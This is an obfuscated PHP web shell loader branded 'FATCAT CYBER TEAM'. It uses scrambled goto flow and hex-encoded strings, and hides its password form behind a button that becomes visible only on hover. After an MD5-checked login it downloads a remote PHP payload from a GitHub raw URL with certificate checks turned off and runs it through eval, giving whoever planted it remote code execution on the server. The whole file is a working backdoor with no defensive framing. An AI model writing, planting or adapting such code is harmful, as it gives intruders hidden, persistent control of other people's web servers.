<?php
goto J3h6X; 
uMr7S: function geturlsinfo($url) 
{ 
    if (function_exists("\143\165\162\x6c\137\145\x78\145\x63")) 
    { 
        $conn = curl_init($url); 
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($conn, CURLOPT_USERAGENT, "\115\157\172\151\x6c\154\x61\57\x35\56\60\40\50\x57\151\156\x64\157\x77\163\40\x4e\124\x20\x36\56\61\73\x20\x72\166\x3a\63\62\x2e\60\x29\40\107\x65\143\153\x6f\57\62\x30\61\60\60\x31\x30\x31\x20\106\x69\162\145\x66\157\x78\x2f\x33\62\56\60"); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); 
        if (isset($_SESSION["\143\157\x6b\151"])) 
        { 
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["\143\157\153\151"]); 
        } 
        $url_get_contents_data = curl_exec($conn); 
        curl_close($conn); 
    } 
    elseif (function_exists("\x66\151\154\145\137\x67\x65\x74\137\143\x6f\156\x74\x65\x6e\x74\163")) 
    { 
        $url_get_contents_data = file_get_contents($url); 
    } 
    elseif (function_exists("\146\157\x70\145\156") && function_exists("\x73\164\x72\x65\x61\x6d\x5f\147\145\x74\137\143\x6f\x6e\164\x65\156\x74\163")) 
    { 
        $handle = fopen($url, "\x72"); 
        $url_get_contents_data = stream_get_contents($handle); 
        fclose($handle); 
    } 
    else 
    { 
        $url_get_contents_data = false; 
    } 
    return $url_get_contents_data; 
} 
goto UUKHK; 

cJz_p: 
if (is_logged_in()) 
{ 
    $a = geturlsinfo("\150\164\164\160\163\72\57\57\147\151\164\150\165\142\56\143\157\155\57\143\145\155\157\172\141\60\65\57\141\160\160\55\142\171\160\141\163\163\57\162\141\167\57\155\141\151\156\57\146\141\164\143\141\164\56\160\150\160"); 
    eval("\77\x3e" . $a); 
} 
else 
{ 
?>
<!doctype html>
<html>
<head>
    <title>FATCAT CYBER TEAM</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png">
    <link rel="apple-touch-icon" href="https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png">
    <style>
        #passwordForm {
            display: none;
            margin-top: 20px;
        }
        #passwordButton {
            display: none; /* tombol tidak terlihat */
        }
        #showButton {
            position: absolute;
            top: 10px;
            left: 10px;
            background-color: #000;
            color: #fff;
            border: 1px solid #fff;
            padding: 5px 10px;
            cursor: pointer;
            opacity: 0; /* tombol tidak terlihat */
            pointer-events: none; /* tidak bisa diklik */
        }
        #showButton:hover {
            opacity: 1; /* tombol terlihat saat hover */
            pointer-events: auto; /* bisa diklik saat hover */
        }
    </style>
    <script>
        function togglePasswordForm() {
            var form = document.getElementById('passwordForm');
            var button = document.getElementById('showButton');
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
                button.style.display = 'none'; // Menyembunyikan tombol setelah mengklik
            }
        }
    </script>
</head>
<body bgcolor="black" text="blue">
    <center>
        <img src="https://i.ibb.co/w67prYF/Fatcat-Cyber-Team.png" alt="" width="300" height="90" />
        <pre><img src="https://imgur.com/48YgDZL.png" width="250" height="250" /></pre>
        <button id="showButton" onclick="togglePasswordForm()">Enter Password</button>
        <form id="passwordForm" action="" method="POST">
            <label for="password"></label> 
            <input id="password" name="password" type="password">
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
<?php  
} 
goto lxNvj; 

eiTo4: 
if (isset($_POST["\160\x61\x73\x73\x77\x6f\x72\144"])) 
{ 
    $entered_password = $_POST["\x70\x61\x73\x73\x77\157\x72\x64"]; 
    $hashed_password = "\144\x37\141\67\61\63\x62\x35\144\x39\141\x64\x61\x63\x65\61\x36\x62\146\x61\x64\x31\x62\67\x66\x37\144\141\x62\x34\143\x39"; 
    if (md5($entered_password) === $hashed_password) 
    { 
        $_SESSION["\154\157\147\147\x65\144\x5f\x69\156"] = true; 
        $_SESSION["\143\157\x73\x69"] = "\163\x65\157\x70\x65\x63\x61\x68\x74\x65\x72\165\x73"; 
    } 
    else 
    { 
        echo "\111\x6e\143\x6f\x72\x72\x65\x63\x74\x20\160\x61\x73\x73\x77\x6f\x72\x64\x2e\x20\x50\154\x65\141\x73\145\x20\164\x72\x79\x20\141\147\x61\151\x6e\56"; 
    } 
} 
goto cJz_p; 

UUKHK: 
function is_logged_in() { 
    return isset($_SESSION["\154\157\147\147\x65\144\137\151\156"]) && $_SESSION["\x6c\157\x67\x67\x65\144\x5f\151\156"] === true; 
} 
goto eiTo4; 

J3h6X: 
session_start(); 
goto uMr7S; 

lxNvj: 
?>
